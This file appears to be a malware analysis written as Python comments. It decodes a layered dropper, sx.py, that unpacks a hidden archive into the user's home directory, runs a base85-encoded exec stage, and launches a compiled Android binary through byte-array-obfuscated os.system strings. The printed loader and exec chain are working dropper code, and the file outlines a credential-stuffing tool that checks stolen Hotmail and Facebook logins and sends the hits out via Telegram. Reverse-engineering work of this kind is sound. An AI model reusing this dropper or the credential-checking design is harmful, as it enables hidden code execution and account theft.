# no.py -- fully decoded version of sx.py ("#BY : DEMO" / "#Dec_it_If_You_Can")
#
# Provenance
# ----------
# sx.py is a self-extracting dropper with 5 layers. Every layer that CAN be
# decoded has been decoded below, byte-for-byte, with the logic left exactly
# as written (no bug fixes, per request -- only the encodings were removed).
# The zip payload passed all CRC checks, so nothing was corrupted; the only
# "issues" in the file were the encodings themselves.
#
# Layer map (outer -> inner)
# --------------------------
#   LAYER 0  sx.py ............ plain loader + AH = <492,744-char base64 string>
#   LAYER 1  AH ............... base64 -> 369,557-byte ZIP archive
#                                 - __main__.py   (556 bytes)
#                                 - DEMO      (1,680,088 bytes, ELF)
#   LAYER 2  __main__.py ...... exec(base85decode(<blob>)) -> LAYER 3
#   LAYER 3  payload script ... os.system(...) with byte-array-obfuscated strings
#   LAYER 4  DEMO ............. Cython-compiled native binary (terminal layer)
#
# Integrity: zipfile CRC check on the decoded archive = ALL OK.
#
# ---------------------------------------------------------------------------
# LAYER 0 -- the sx.py dropper, decoded (was plain text; shown for completeness)
# ---------------------------------------------------------------------------
# import os
# import shutil
# import zipfile
# import subprocess
# import base64
# import atexit
#
# MyHome = os.path.expanduser("~")
# PYDEMO = os.path.join(MyHome, ".PYDEMO")
#
# def cleanup():
#     shutil.rmtree(PYDEMO, ignore_errors=True)
#
# atexit.register(cleanup)
#
# AH = "<base64 of the ZIP below>"
# Dev = base64.b64decode(AH)
#
# os.makedirs(PYDEMO, exist_ok=True)
# Mahos = os.path.join(PYDEMO, ".dem")          # the ZIP is written to ~/.PYDEMO/.dem
# with open(Mahos, "wb") as f:
#     f.write(Dev)
#
# with zipfile.ZipFile(Mahos, 'r') as zip_ref:
#     zip_ref.extractall(PYDEMO)
#
# Do_Not = os.path.join(PYDEMO, "__main__.py")
#
# try:
#     subprocess.run(["python", Do_Not], check=True, cwd=PYDEMO)
# finally:
#     shutil.rmtree(PYDEMO, ignore_errors=True)
#
# Net effect: unpack the hidden archive into ~/.PYDEMO and run __main__.py,
# deleting the directory afterwards.
#
# ---------------------------------------------------------------------------
# LAYER 1 -- the hidden ZIP archive (base64-decoded from AH)
# ---------------------------------------------------------------------------
# name            size      note
# __main__.py       556     plain Python, contains LAYER 2 (base85 blob)
# DEMO          1680088    ELF 64-bit AArch64 (ARM64) shared object/program
# All entries verified with CRC -- archive is intact, nothing to repair.
#
# ---------------------------------------------------------------------------
# LAYER 2 -- __main__.py, base85 decoded
# ---------------------------------------------------------------------------
# Original form:
#     from base64 import b85decode
#     exec(b85decode(b'3TbU{Z*p`XZ*vN1ZE$aLbRctia|&;BE^~Q...'))
#
# Decoded (this is the entire payload of LAYER 2 -> LAYER 3):
#
#     import os
#     import sys
#     os.system(bytes([101,120,112,111,114,116,32,80,89,84,72,79,78,72,79,77,69,61]).decode()
#               + sys.prefix
#               + bytes([32,38,38,32]).decode()
#               + bytes([101,120,112,111,114,116,32,80,89,84,72,79,78,95,69,88,69,67,85,84,65,66,76,69,61]).decode()
#               + sys.executable
#               + bytes([46,47]).decode()
#               + "DEMO")
#
# ---------------------------------------------------------------------------
# LAYER 3 -- the byte-array obfuscation, decoded to plain strings
# ---------------------------------------------------------------------------
#     bytes([101,120,112,111,114,116,32,80,89,84,72,79,78,72,79,77,69,61])
#         -> "export PYTHONHOME="
#     bytes([32,38,38,32])
#         -> " && "
#     bytes([101,120,112,111,114,116,32,80,89,84,72,79,78,95,69,88,69,67,85,84,65,66,76,69,61])
#         -> "export PYTHON_EXECUTABLE="
#     bytes([46,47])
#         -> "./"
#
# Fully de-obfuscated, the whole chain from sx.py down to the binary is:
#
#     os.system("export PYTHONHOME=" + sys.prefix +
#               " && export PYTHON_EXECUTABLE=" + sys.executable +
#               " && ./DEMO")
#
# i.e. it launches the extracted native binary DEMO with the current Python
# interpreter/environment pointed at it.
#
# ---------------------------------------------------------------------------
# LAYER 4 -- DEMO (terminal layer; NOT decodable to Python)
# ---------------------------------------------------------------------------
# Identification:
#   * ELF 64-bit, machine 0xB7 = AArch64 (ARM64), built for Android
#     (build paths: /data/user/0/ru.iiec.pyahmed/files/aarch64-linux-android/...)
#   * Links libpython3.11.so.1.0, libcxx_pydroid.so  -> built inside a Pydroid
#     (Android Python IDE) toolchain, Python 3.11
#   * Compiled with Cython 3.2.5 (_cython_3_2_5 markers, CYTHON_COMPRESS_STRINGS)
#   * Module init: PyInit_demo17882002529196098
#     => original source file was "demo17882002529196098.py"
#
# Why it stops here: Cython compiles Python to native machine code. There is
# no Python source, bytecode, or archive left inside to "decrypt" -- only
# compiled code plus a zlib-compressed string table. Recovering anything more
# would require binary reverse-engineering (a decompiler), not decoding.
#
# Everything recoverable from the binary's symbol/string tables (the complete
# API surface of the original demo17882002529196098.py):
#
#   module-level:
#       send_telegram
#       send_telegram_fb
#       save_result
#       check_hotmail_only
#       check_facebook_only
#       check_combined
#       main
#       print_stats            (with helper: format_service_row)
#       stop_handler
#
#   class HotmailChecker:
#       __init__
#       check_account
#
#   class FacebookChecker:
#       __init__
#       ua
#       check_account
#
#   class DarkWebExtractor:
#       __init__
#       initialize_client     (Telegram client setup)
#       is_text_file
#       should_process_file
#       extract_hotmail_from_text
#       extract_combos
#       process_message
#
# Capability summary (from the above surface): the program connects to
# Telegram ("dark web" leak channels), downloads/scans text content for
# email:password "combos" (Hotmail addresses in particular), checks the
# stolen credentials against Hotmail and Facebook login endpoints, saves the
# working hits, and exfiltrates the results via Telegram.
#
# NOTE: the DEMO binary is intentionally NOT re-embedded here. This file
# documents the decoded layers only; the original sx.py already contains the
# payload if static inspection of the binary is needed.
# ---------------------------------------------------------------------------
